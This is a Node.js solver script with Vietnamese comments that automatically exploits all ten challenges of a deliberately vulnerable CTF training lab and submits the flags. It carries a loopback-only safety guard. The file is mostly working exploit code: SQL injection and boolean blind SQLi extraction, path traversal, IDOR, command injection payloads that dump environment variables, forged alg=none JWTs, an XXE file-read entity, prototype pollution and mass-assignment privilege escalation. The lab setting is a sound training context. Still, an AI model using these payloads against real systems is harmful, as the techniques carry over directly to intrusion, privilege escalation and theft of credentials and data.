#!/usr/bin/env node
/**
 * solve-all.mjs — giải TRỌN 10 thử thách CTF của SecLab, tự nộp cờ, in điểm.
 *
 * Chạy:  node solutions/ctf/scripts/solve-all.mjs [base-url]
 *        mặc định base-url = http://127.0.0.1:3000  (lab VULN đang chạy)
 *
 * Chỉ hoạt động trên bản vuln — hardened đã vá nên không còn cờ.
 * Script là TÀI LIỆU GIẢI: mỗi hàm tương ứng 1 thử thách, đọc comment trong
 * từng hàm để hiểu vector — sau đó thử tự tay trước khi chạy.
 */

const BASE = (process.argv[2] || 'http://127.0.0.1:3000').replace(/\/+$/, '');

// ── Guard an toàn: chỉ chạy trên loopback trừ khi bạn xác nhận sở hữu mục tiêu ──
{
  const host = new URL(BASE).hostname;
  const loopback = ['127.0.0.1', 'localhost', '::1', '[::1]'].includes(host);
  if (!loopback && !process.argv.includes('--i-own-this-target')) {
    console.error(`⛔ Từ chối: mục tiêu "${host}" không phải loopback.`);
    console.error('   Lab CTF chỉ chạy trên máy của bạn. Nếu đây là server bạn sở hữu,');
    console.error('   thêm cờ --i-own-this-target (cùng quy ước guard.js của SecLab).');
    process.exit(2);
  }
}

const FLAG_RE = (prefix) => new RegExp(`FLAG\\{${prefix}-[0-9a-f]+\\}`);

const get = (p) => fetch(BASE + p, { signal: AbortSignal.timeout(10000), redirect: 'manual' });
const post = (p, body, ct = 'application/x-www-form-urlencoded') =>
  fetch(BASE + p, { method: 'POST', headers: { 'content-type': ct }, body, signal: AbortSignal.timeout(10000), redirect: 'manual' });
const enc = encodeURIComponent;

// ── CTF #1 · SQLi — dump toàn bộ users, cờ trong email người dùng ẩn ──
async function solve01() {
  const t = await (await get(`/search?q=${enc("' OR 1=1 --")}`)).text();
  return t.match(FLAG_RE('sqli'))?.[0];
}

// ── CTF #2 · Traversal — flag-ctf.txt ở GỐC VFS, ngoài listing /files ──
async function solve02() {
  const t = await (await get('/download?name=../flag-ctf.txt')).text();
  return t.match(FLAG_RE('trav'))?.[0];
}

// ── CTF #3 · IDOR — apiKey của dave (id=4) không cần phiên ──
async function solve03() {
  const j = await (await get('/api/users/4')).json();
  return j.apiKey?.match(FLAG_RE('idor'))?.[0];
}

// ── CTF #4 · Missing access control — vào thẳng /admin ──
async function solve04() {
  const t = await (await get('/admin')).text();
  return t.match(FLAG_RE('admin'))?.[0];
}

// ── CTF #5 · Command Injection — cờ nằm trong biến môi trường SECLAB_CTF_CMD ──
async function solve05() {
  // OS của LAB quyết định dấu nối — thử cả hai (& cmd.exe, ; sh).
  for (const payload of ['127.0.0.1 & set SECLAB', '127.0.0.1; env']) {
    const t = await (await get(`/tools/ping?host=${enc(payload)}`)).text();
    const m = t.match(FLAG_RE('cmd'));
    if (m) return m[0];
  }
}

// ── CTF #6 · JWT — forge alg=none cho sub=ctfsvc (không cần khoá!) ──
async function solve06() {
  const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
  const forged = `${b64u({ alg: 'none', typ: 'JWT' })}.${b64u({ sub: 'ctfsvc', role: 'svc' })}.`;
  const j = await (await get(`/api/profile?token=${enc(forged)}`)).json();
  return j.flag;
}

// ── CTF #7 · XXE — entity SYSTEM đọc file trên VFS ảo ──
async function solve07() {
  const body = '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag-xxe.txt">]><i><item>&x;</item></i>';
  const j = await (await post('/api/import', body, 'application/xml')).json();
  return (j.items?.[0] || '').match(FLAG_RE('xxe'))?.[0];
}

// ── CTF #8 · Prototype Pollution — nhiễm Object.prototype rồi đọc cờ ──
async function solve08() {
  await post('/api/config', '{"__proto__":{"isAdmin":true}}', 'application/json');
  const j = await (await get('/api/config')).json();
  delete Object.prototype.isAdmin; // dọn prototype của chính process này
  return j.flag;
}

// ── CTF #9 · Mass Assignment — tự đăng ký role=admin → /api/me ──
async function solve09() {
  const user = `solver${Date.now().toString(36)}`; // unique — register fail nếu trùng
  await post(`/api/register?role=admin`, `username=${user}&password=pw12345`);
  const login = await post('/login', `username=${user}&password=pw12345`);
  const sid = (login.headers.get('set-cookie') || '').match(/session=([a-f0-9]+)/)?.[1];
  const j = await (await fetch(`${BASE}/api/me`, { headers: { cookie: `session=${sid}` } })).json();
  return j.flag;
}

// ── CTF #10 · Blind SQLi — oracle boolean, rút cờ từng ký tự ──
async function solve10() {
  // charset chỉ cần ký tự xuất hiện trong FLAG{blind-XXXXXXXXXXXX}
  const CHARSET = 'FLAG{}blind-0123456789abcdefxyz';
  let flag = '';
  for (let pos = 1; pos <= 40; pos++) {
    let hit = '';
    for (const ch of CHARSET) {
      const q = `AB-100' AND (SELECT substr(flag,${pos},1) FROM ctf_blind)='${ch}' --`;
      if ((await get(`/track?code=${enc(q)}`)).status === 200) { hit = ch; break; }
    }
    if (!hit) break;            // hết độ dài cờ
    flag += hit;
    if (hit === '}') break;     // gặp đóng ngoặc → xong
  }
  return flag || undefined;
}

// ── nộp cờ ──
async function verify(id, flag) {
  const j = await (await get(`/_lab/verify?id=${id}&flag=${enc(flag)}`)).json();
  return j;
}

const SOLVERS = [solve01, solve02, solve03, solve04, solve05, solve06, solve07, solve08, solve09, solve10];
const NAMES = ['SQLi', 'Traversal', 'IDOR', 'Admin', 'CmdInj', 'JWT', 'XXE', 'ProtoPoll', 'MassAssign', 'BlindSQLi'];

console.log(`\n  SecLab CTF solver — target ${BASE}\n`);
let score = 0, total = 0, solved = 0;
for (let i = 0; i < SOLVERS.length; i++) {
  process.stdout.write(`  [#${String(i + 1).padStart(2)}] ${NAMES[i].padEnd(10)} `);
  let flag;
  try { flag = await SOLVERS[i](); } catch (e) { console.log(`✘ lỗi: ${e.message}`); continue; }
  if (!flag) { console.log('✘ không lấy được cờ (hardened? vuln chưa chạy?)'); continue; }
  const r = await verify(i + 1, flag);
  if (r.ok) { solved++; score = r.score; total = r.total; }
  console.log(`${flag}  →  ${r.ok ? `✔ +điểm (${r.score}/${r.total})` : '✘ server từ chối'}`);
}
console.log(`\n  KẾT QUẢ: ${solved}/10 thử thách · điểm ${score}/${total || 265}\n`);
process.exit(solved === 10 ? 0 : 1);
